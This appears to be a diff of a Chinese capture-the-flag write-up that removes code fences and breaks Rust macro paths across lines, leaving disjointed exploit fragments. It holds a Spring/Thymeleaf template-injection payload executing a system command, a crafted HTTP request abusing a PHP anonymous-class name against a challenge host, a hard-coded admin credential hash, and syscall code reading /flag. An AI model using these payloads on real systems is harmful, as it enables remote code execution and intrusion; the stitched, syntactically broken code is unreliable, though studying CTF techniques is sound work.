@@ -20,37 +20,12 @@ if (!isset($_SERVER['PHP_AUTH_USER'])) {
 } else {
     $validUser = 'admin';
     $validPass = '2e525e29e465f45d8d7c56319fe73036';
-```
-
-
-
-```
 <!--?php
-```
-
-
-
-```
 Context context = new Context();
 SpringTemplateEngine engine = new SpringTemplateEngine();
 return engine.process(hostname, (IContext)context);
-```
-
-
-
-```
 [[${T(java.lang.Boolean).forName("com.fasterxml.jackson.databind.ObjectMapper").newInstance().readValue("{}",T(java.lang.Boolean).forName("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression("T(Runtime).getRuntime().exec('calc')").getValue()}]]
-```
-
-
-
-```
 /flag.php?ezphpPhp8=ko1sh1
-```
-
-
-
-```
 <?php
 if (isset($_GET['ezphpPhp8'])) {
     highlight_file(__FILE__);
@@ -61,11 +36,6 @@ $a = new class {
     function __construct()
     {
     }
-```
-
-
-
-```
 GET /flag.php?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0 HTTP/1.1
 Host: eci-2zef6aoe4x8c78fobzdc.cloudeci1.ichunqiu.com
 Connection: keep-alive
@@ -82,11 +52,6 @@ Sec-Fetch-Dest: document
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1711431296,1711937711,1712027510
-```
-
-
-
-```
 fn main() {
     let mut buf = [0u8; 1024];
     let filename = "/flag\0";
@@ -94,7 +59,9 @@ fn main() {
     let count: usize;
     unsafe {
         // open 系统调用
-        core::arch::asm!(
+        core::
+arch::
+asm!(
             "syscall",
             in("rax") 2, // sys_open
             in("rdi") filename.as_ptr(),
@@ -104,7 +71,9 @@ fn main() {
         // 检查文件描述符是否有效
         if fd >= 0 {
             // read 系统调用
-            core::arch::asm!(
+            core::
+arch::
+asm!(
                 "syscall",
                 in("rax") 0, // sys_read
                 in("rdi") fd,
@@ -113,7 +82,9 @@ fn main() {
                 lateout("rax") count,
             );
             // write 系统调用，将读取的内容写到标准输出
-            core::arch::asm!(
+            core::
+arch::
+asm!(
                 "syscall",
                 in("rax") 1, // sys_write
                 in("rdi") 1, //
@@ -123,11 +94,6 @@ fn main() {
         }
     }
 }
-```
-
-
-
-```
 with open("output.pkl", "rb") as file:
     signal = pickle.load(file)
 single_signal_list = []
